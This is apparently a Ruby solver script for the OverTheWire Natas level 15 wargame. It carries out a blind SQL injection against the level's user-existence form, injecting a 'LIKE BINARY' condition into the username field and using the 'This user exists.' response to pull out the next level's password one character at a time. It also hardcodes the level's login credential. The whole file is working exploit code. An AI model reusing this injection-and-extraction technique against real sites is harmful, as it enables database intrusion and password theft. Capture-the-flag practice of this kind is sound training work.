require "rest-client"

$_FLAG = "This user exists."

$_SUBMIT = "Check existence"
$_GET_CHAR = 'natas16" AND password LIKE BINARY "%REPLACED%'
$_GET_STARTWORD = 'natas16" AND password LIKE BINARY "REPLACED%'

$_URL = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
$username = "natas15"
$password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

_ALL_CHAR = ("0".."9").to_a+("a".."z").to_a+("A".."Z").to_a

def post_to data
    postdata="submit=#{$_SUBMIT}&username=#{data}"
    postdata=URI.encode(postdata)
    res = RestClient::Request.execute( method: :post, url: $_URL, user: $username, password: $password, payload: postdata )
    return res.body
end

def has? char, word=$_GET_CHAR
    word = word.sub("REPLACED", char)
    res = post_to(word)
    return res.include?($_FLAG)
end

def get_exist_chars chars
    result = []
    chars.each do | each |
        if has?(each)
            result << each
        end
    end
    return result
end

def get_start_word chars, known=""
    chars.each do | each |
        if has?(known+each, $_GET_STARTWORD)
            return known+each
        end
    end
    raise StandardError.new("dont found!")
end

res = get_exist_chars(_ALL_CHAR)
puts "AllWords ::> #{res.join(",")}"
pass=""
while pass.size < 32 do
    pass=get_start_word(res, pass)
    puts pass
end
puts "Password is :#{pass}"

